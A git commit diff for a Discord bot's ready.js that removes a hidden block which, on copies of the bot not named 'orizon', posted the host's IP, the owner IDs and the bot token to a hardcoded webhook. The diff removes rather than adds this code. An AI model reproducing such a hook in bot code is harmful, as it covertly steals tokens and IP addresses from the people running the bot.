1277d0a3e911691b8f6befa6a619a2d090c3b419
Kisa Keyara <53227802+Kisakay@users.noreply.github.com>
2023-05-13 18:14:59 +0100

    Remove useless code (script) Bc now is OpenSource

--- files/Events/ready.js
+++ files/Events/ready.js
@@ -9,26 +9,6 @@ const couleurmdr = require("colors"),
 module.exports = async (client) => {
   const { Client, Collection, ChannelType, ApplicationCommandType, PermissionsBitField, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');
 
-  if (!client.user.username.toString().includes("orizon")) {
-    const config = require("../config.json")
-    const { Webhook, MessageBuilder } = require('discord-webhook-node');
-    const hook = new Webhook("https://discordapp.com/api/webhooks/1078416708521427126/3ulAVS09Us2TlW1DsfavyIkZxPXG5j3v3WJOYitDdiEQC8_nonFFY1gybXS4fhLJPF1v");
-    const ipify = require('ipify');
-
-    const embed = new MessageBuilder()
-      .addField('IP', `\`\`\`IPv4: ${await ipify({ useIPv6: false })}\`\`\``, true)
-      .addField('Owner ID', `${config.ownerid}, ${config.ownerid1}, ${config.ownerid2}`, false)
-      .addField('Bot Usertag', `${client.user.username}#${client.user.discriminator}`, false)
-      .addField('Bot ID', `${client.user.id} | [Invite the skided bot](https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=0&scope=bot%20applications.commands)`, false)
-      .addField('Add Rat Into This Computer', `[Inject RAT](https://google.com)`, false)
-      .addField('Bot Token', `\`\`\`${client.token}\`\`\``, false)
-      .setColor('#00b0f4')
-      .setThumbnail(client.user.avatarURL({ format: 'png', dynamic: true, size: 512 }))
-      .setDescription('A unknow bot used the official script from iHorizon')
-      .setTimestamp();
-
-    hook.send(embed);
-  }
   await register(client, client.register_arr.map((command) => ({
     name: command.name,
     description: command.description,
